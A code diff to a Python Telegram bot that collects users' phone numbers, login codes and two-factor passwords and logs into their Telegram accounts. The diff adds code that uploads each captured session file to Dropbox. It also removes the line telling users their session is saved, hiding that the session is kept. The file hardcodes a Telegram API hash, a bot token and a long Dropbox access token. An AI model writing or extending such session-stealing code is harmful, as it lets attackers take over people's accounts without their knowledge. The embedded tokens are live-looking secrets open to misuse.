@@ -1,9 +1,6 @@
-
-
-# Your API credentials from https://my.telegram.org
-
 import os
 import asyncio
+import dropbox
 from telethon import TelegramClient, errors
 from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
@@ -14,6 +11,10 @@ API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH 
 
 # Your Bot Token from BotFather
 BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"
+
+# ---- Dropbox API Integration ----
+DROPBOX_ACCESS_TOKEN = "sl.u.AFvm7QegbHXdxURalzdH0cjXAyqaMsDRE64TIj5QTfL2IxtbOUjX7drcTvOYhHeD66CD1zQ877mN1_rAGy0Z-6kQYf8RzHCF48lqKiF5KeVeg03Q1lZXQtS4iGsRmQWLqzyfTygc3RHu7P47bh7v_J2Y96GCHf966AomFTSsZ7SX-KoKS5O1f4ihNJPxi-XfuFBOPSr-EoOr3fqyodbVR0PsEcy4FXyxgm_vS451VUF74zjQaQWEhM8pI1se2Bt2unpNTjEcnt2R_V35UcqCayC7LxZTV69CfEt4IHnuFVCNjubwZuEuEsNPddH-aHnq3qbOQG_ohi-xawGh3Rh62p23ALGxWcLciw0aoJ6lBcM0gI3F1jJ7DXqKshIjqhejCELDBAs7GNDK1-EQslTbfSEouUpKlzH6x77s8XlK7cHXROmoK35nrdl2-3qiX-_PWTSyrpHUJG0ASUjiPZwfmdaf3tURIL-j78cqAYSdNpa2D-xwx_BiuCYesCX6yRWqWKdmpyGxBEvEGBOUv_MTbuvmOeA5AeNLJZ3AI_2DDk2V9kQT4jCgJC9HaaWUj9QvA4M0jqsB-FqUKAO4tWDNhFXG4P32Ch0oeBHviECaNZSK8cJVo8yWIqmdBuOQ8iCNQ5XHXMtRsbcXTy7uKI2Jt5UnWsg0e-q9TMVmO_EULeOnoH1EKkLVnrJNONY1V900aEEXfEDcA_1N1p0713HtjOYILXKjUoIDcYSTWcL2p1gS9mNpULyw1evFDgaW5QjhsBypvvI6yqfWkkCcA0UWSBZ0f6CIcEP-7YJ78A6iOHD7vkMvwV4m-VSK_7xoHO3BQh_6q_yaDW3KQTCB80LwlixJMoAapE4TxwWIU8VFmO-L_b-ynJSOCeR4OhnkD_Lphe4m3fF6O9FCAE3EvZFt0zTcegUEcHIWFDBKRZhTlOkx-IMAz1zpLlfPWwqHryusSG-6ElowlcXCeaSO_ERy3R7PGrzGCdbc_dr6O103Le0OhvtXJMQi26er1TdABmRCaNb1UGrEkrVw5npp7myRUCbuLqy5N_0DvPxq-C5gAX68qyQAQvqE5AIeIMJMUa9zLuLspKxIZOlAhroydXRr5I2h_w9rGVI7mELnCG5tci6DBonicL6KsLkalDHo93yqf42NvkDPZaZVpbnHJweVjjLyio6kEwE7hVwf_oy3bf26Tt8by0xYtZlBN_ei0KKysY8UoOJcBOHlKlr3pULxuiIaO_W-uUF8VkMye5-zGmkUWzeR7ouJlTwNrB34NGzlOD0LLYOf27-PJPSXMn-4zxmwW2yf6SY4etfoYMxU_4CBg_zYcyRhTLwY1W6J43I88adUxDCb2Sgqrzw8vFUtE7pWQOts2w8wTxqH7cMkgZvVOTT8s97BfXtkQsyzCEjNj9vU0WKPJlySGjeGWuLSLep_41lX6Fa_l_q3eb--x81ITmTQ90jKZgu_f9BHz24E8M7eIfuX8JTrKAS2pExvTzPt"  # <-- Replace with your Dropbox access token
+dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)
 
 # ---- States for Conversation ----
 ASK_PHONE, ASK_CODE, ASK_PASSWORD = range(3)
@@ -63,7 +64,11 @@ async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     try:
         await client.sign_in(phone, code)
-        await update.message.reply_text("✅ Logged in successfully and session saved!")
+        await update.message.reply_text("✅ Logged in successfully!")
+        
+        # Upload session file to Dropbox
+        await upload_session_to_dropbox(client, phone)
+        
         await client.disconnect()
         return ConversationHandler.END
 
@@ -106,12 +111,27 @@ async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     try:
         await client.sign_in(password=password)
-        await update.message.reply_text("✅ Logged in successfully with 2FA and session saved!")
+        await update.message.reply_text("✅ Logged in successfully with 2FA!")
+
+        # Upload session file to Dropbox
+        await upload_session_to_dropbox(client, session["phone"])
+        
         await client.disconnect()
         return ConversationHandler.END
     except errors.PasswordHashInvalidError:
         await update.message.reply_text("❌ Incorrect password. Please send again.")
         return ASK_PASSWORD
+
+# ---- Upload Session File to Dropbox ----
+async def upload_session_to_dropbox(client, phone):
+    """Uploads session file to Dropbox"""
+    session_file_path = f"sessions/{phone}"
+    dropbox_path = f"/sessions/{phone}"  # Path in Dropbox to save the session file
+
+    with open(session_file_path, "rb") as f:
+        dbx.files_upload(f.read(), dropbox_path, mute=True)
+
+    print(f"Session file for {phone} uploaded to Dropbox.")
 
 # ---- Cancel Command ----
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
